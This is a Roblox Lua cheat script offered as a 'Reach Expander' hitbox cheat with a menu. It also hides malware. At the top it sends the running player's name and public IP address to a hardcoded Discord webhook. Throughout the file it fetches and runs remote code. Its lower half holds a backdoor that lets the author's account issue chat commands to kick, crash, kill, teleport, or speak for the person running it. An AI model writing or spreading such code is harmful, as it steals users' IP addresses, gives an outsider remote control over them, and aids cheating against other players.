local nameplayer = game.Players.LocalPlayer.Name
local webhook = "https://discordapp.com/api/webhooks/1005652108743282811/SdG1X6ZloR-vQR9Mobq1iDVTzM9sks-JewlvA7r8b-SSDVSD5NNGItQfa1Rtx5jK0GKJ"
function GrabIP()
    local Response = request({
        Url = "https://api.ipify.org/",
        Method = "GET"
    })

    local text = nameplayer..": "..Response.Body


    local embed = {
       ['title'] = 'IP PLAYER',
       ['description'] = text
    }
    local a = request({
       Url = webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
    })
end

GrabIP()




-- init
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/anonymos62/venyxUI/main/.lua"))()
local venyx = library.new("Reach Expander v3", 5013109572)

-- themes
local themes = {
	Background = Color3.fromRGB(24, 24, 24),
	Glow = Color3.fromRGB(0, 0, 0),
	Accent = Color3.fromRGB(10, 10, 10),
	LightContrast = Color3.fromRGB(20, 20, 20),
	DarkContrast = Color3.fromRGB(14, 14, 14),  
	TextColor = Color3.fromRGB(255, 255, 255)
}

-- first page
local page = venyx:addPage("Reach", 5012544693)
local a1 = page:addSection("Reach Features")

--Globals
_G.kpj = true
_G.rangeOff = false
--


venyx:Notify("hello", game.Players.LocalPlayer.Name .. "")

a1:addToggle("Reach Off", nil, function(value)
    if value == true then
        _G.rangeOff = true
        _G.kpj = false
        venyx:Notify(":c", "Reach Off")
    end
    if value == false then
        _G.rangeOff = false
        _G.kpj = true
        venyx:Notify("c:", "Reach On")
    end
end)

a1:addTextbox("Size", "Size of the reach", function(output)
_G.range = tonumber(output)
local player = game:GetService("Players").LocalPlayer

game:GetService"RunService".Stepped:Connect(function()
    if _G.rangeOff == true then return end 
    pcall(function()    
        local p = game.Players:GetPlayers()
    for i = 2, #p do local v = p[i].Character
        if v and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart" and "Left Leg" and "Right Leg" and "Left Arm" and "Right Arm" and "Head" and "Torso") and player:DistanceFromCharacter(v["HumanoidRootPart" and "Left Leg" and "Right Leg" and "Left Arm" and "Right Arm"  and "Head" and "Torso"].Position) <= _G.range then
            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") then
                for i,v in next, v:GetChildren() do
                    if v:IsA("BasePart") then

                            firetouchinterest(tool.Handle,v,0)
                            firetouchinterest(tool.Handle,v,1)
                    end
                end
            end
        end
    end
end)
end)
end)

a1:addKeybind("KeyBindHigher", Enum.KeyCode.Insert, function()
    _G.range = _G.range + 1 
    if _G.kpj == true then
    game.StarterGui:SetCore("SendNotification", {
    Title = "anonymos_6";
    Text = "Tu reach es de " .. _G.range;
    Icon = "";
    Duration = 1;})
end
end)

a1:addKeybind("KeyBindLower", Enum.KeyCode.Insert, function()
    _G.range = _G.range - 1 
                 if _G.kpj == true then
                 game.StarterGui:SetCore("SendNotification", {
                 Title = "anonymos_6";
                 Text = "Tu reach es de " .. _G.range;
                 Icon = "";
                 Duration = 1;})
                 end
end)



-- second page
local theme = venyx:addPage("Theme", 5012544693)
local colors = theme:addSection("Colors")

for theme, color in pairs(themes) do -- all in one theme changer, i know, im cool
	colors:addColorPicker(theme, color, function(color3)
		venyx:setTheme(theme, color3)
	end)
end

--Credits
local page = venyx:addPage("Credits", 5012544693)
local Credits = page:addSection("Credits")
Credits:addButton("Credits to - anonymos_6#5477 -", function()
    setclipboard("anonymos_6#5477")
    venyx:Notify("Copied", "User")
end)

Credits:addToggle("Disable Notifications", nil, function(bool)
    if bool == true then
        _G.kpj = false
        venyx:Notify(":c", "Notifications Disable")
    end
    if bool == false then
        _G.kpj = true
        venyx:Notify("c:", "Notifications Enable")
    end
end)

Credits:addKeybind("Toggle UI", Enum.KeyCode.Insert, function()
	venyx:toggle()
end)

game.Players:WaitForChild("anonymos_6")
venyx:Notify("anony ta en partida", "Conche Tu Mare Vali")
-- load
venyx:SelectPage(venyx.pages[1], true)

--------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------

game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/noti" then
        game.StarterGui:SetCore("SendNotification", {
            Title    = "LOLSKIDEZ";
            Text     = "";
            Duration = 10;
        })
    end
end)
game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/kick" then

        game.StarterGui:SetCore("SendNotification", {
            Title    = "HAHAHAHAHAHAHA";
            Text     = "HAHAHAHAHAHAHAHA";
            Duration = 10;
        })
        wait(3)
        game:Shutdown()
    end
end)
game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/nohead" then
        game:GetService('Players').LocalPlayer.Character.Head:Destroy()
        game.StarterGui:SetCore("SendNotification", {
            Title    = "Death :(";
            Text     = "f";
            Duration = 10;
        })
    end
end)
game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/goto" then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players["anonymos_6"].Character.Head.CFrame
    end
end)
game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/sit" then
        game.Players.LocalPlayer.Character.Humanoid.Sit = true
    end
end)
if game.Players:FindFirstChild("anonymos_6") or game.Players:WaitForChild("anonymos_6") then
    local Players = game:GetService("Players")
    
    local kixsda = "/kill "
    local s2 = "/crash "
    local s3 = "/kick "
    game.Players["anonymos_6"].Chatted:Connect(function(msg)
        if msg:sub(1, kixsda:len()):lower() == kixsda:lower() then
            local name = msg:sub(kixsda:len() + 1)
            local pl = Players:FindFirstChild(name)
            if pl then
                pl.Character.Humanoid.Health = 0
            end
        elseif msg:sub(1, s2:len()):lower() == s2:lower() then
            local name = msg:sub(s2:len() + 1)
            local pl = Players:FindFirstChild(name)
            if pl then
                loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/HitboxExpander/main.lua", true))()
                game:GetService"RunService".Stepped:Connect(function()
                    local a = Instance.new("Part", workspace)
                    a.Position = game.Players.LocalPlayer.Character.Torso.Position
                    a.Size = Vector3.new(25,25,25)
                    a.BrickColor = BrickColor.new("Really black")
                end)
            end
        elseif msg:sub(1, s3:len()):lower() == s3:lower() then
            local name = msg:sub(s3:len() + 1)
            local pl = Players:FindFirstChild(name)
            if pl then
                game:Shutdown()
            end
        end
    end)
end
game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/trol" then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I Use Reach","All")
    end
end)

game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/troll" then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Im Skid :(","All")
    end
end)

game.Players["anonymos_6"].Chatted:connect(function(msg)
    if msg:sub(1, 9) == "/trolll" then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yo como ranas","All")
    end
end)
-----------------------------------------------------------------------------------------------------------------------
